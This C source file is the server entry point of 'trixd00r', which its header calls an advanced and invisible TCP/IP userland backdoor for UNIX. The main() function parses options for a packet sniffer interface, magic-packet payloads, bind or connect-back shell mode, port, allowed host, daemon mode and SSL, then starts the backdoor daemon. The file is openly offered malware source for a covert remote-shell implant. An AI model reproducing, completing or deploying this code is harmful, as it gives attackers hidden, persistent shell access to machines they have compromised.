/*******************************************************************************
 *                ____                     _ __                                *
 *     ___  __ __/ / /__ ___ ______ ______(_) /___ __                          *
 *    / _ \/ // / / (_-</ -_) __/ // / __/ / __/ // /                          *
 *   /_//_/\_,_/_/_/___/\__/\__/\_,_/_/ /_/\__/\_, /                           *
 *                                            /___/ nullsecurity team          * 
 *                                                                             *
 * trixd00r - Advanced and invisible TCP/IP based userland backdoor            *
 *                                                                             *
 * FILE                                                                        *
 * server/src/trixd00rd.c                                                      *
 *                                                                             *
 * DATE                                                                        *
 * 02/10/2012                                                                  *
 *                                                                             *
 * DESCRIPTION                                                                 *
 * trixd00r is an advanced and invisible userland backdoor based on TCP/IP for *
 * UNIX systems. It consists of a server and a client. The server sits and     *
 * waits for magic packets using a sniffer. If a magic packet arrives, it will *
 * bind a shell over TCP or UDP on the given port or connecting back to the    *
 * client again over TCP or UDP. The client is used to send magic packets to   *
 * trigger the server and get a shell.                                         *
 *                                                                             *
 * COPYRIGHT                                                                   *
 * Read docs/COPYING.                                                          *
 *                                                                             *
 * AUTHOR                                                                      *
 * noptrix - http://www.nullsecurity.net/                                      *
 *                                                                             *
 ******************************************************************************/

#include "trixd00rd.h"
#include "checks.h"
#include "controller.h"
#include "help.h"
#include "verbose.h"
#include "wrapper.h"

#include <getopt.h>


/* let's go... */
int main(int argc, char *argv[])
{
    int c = 0;
    ctrl_t *ctrl = NULL;


    /* banner is very important */
    banner();
    check_argc(argc);
    ctrl = alloc_structs();
    ctrl = set_ctrl_defaults(ctrl);

    while ((c = getopt(argc, argv, "i:t:p:s:b:a:c:z:dnxvVH")) != -1) {
        switch (c) {
         case 'i':
             check_uid(ctrl);
             ctrl->sniffer->iface = optarg;
             break;
         case 't':
             check_pkt_type(ctrl, optarg);
             ctrl->packet->type = ATOI(optarg);
             break;
         case 'p':
             ctrl->packet->m_payload = optarg;
             break;
         case 's':
             check_shell_mode(ctrl, optarg);
             ctrl->shell->mode = (unsigned char) ATOI(optarg);
             break;
         case 'b':
             check_port(ctrl, ATOI(optarg));
             ctrl->shell->port = ATOI(optarg);
             break;
         case 'a':
             check_host(optarg);
             ctrl->packet->allowed_host = convert_host(optarg);
             break;
         case 'c':
             check_host(optarg);
             ctrl->shell->host = convert_host(optarg);
             break;
         case 'z':
             ctrl->packet->b_payload = optarg;
             break;
         case 'd':
             ctrl->daemon = DAEMON;
             break;
         case 'n':
             ctrl->shell->banner = BANNER_OFF;
             break;
         case 'x':
             ctrl->ssl = SSL;
             break;
         case 'v':
             ctrl->verbose = VERBOSE;
             break;
         case 'V':
             puts(VERSION);
             __EXIT_SUCCESS;
             break;
         case 'H':
             usage();
             __EXIT_SUCCESS;
             break;
         default:
             __EXIT_FAILURE;
        }
    }

    /* quick checks of arguments and values */
    __VERBOSE_ARGS;
    check_args(ctrl);

    /* install signal handlers here */
    install_signals();

    /* whole action starts here my darling */
    start_trixd00rd(ctrl);

    return 0;
}

/* EOF */
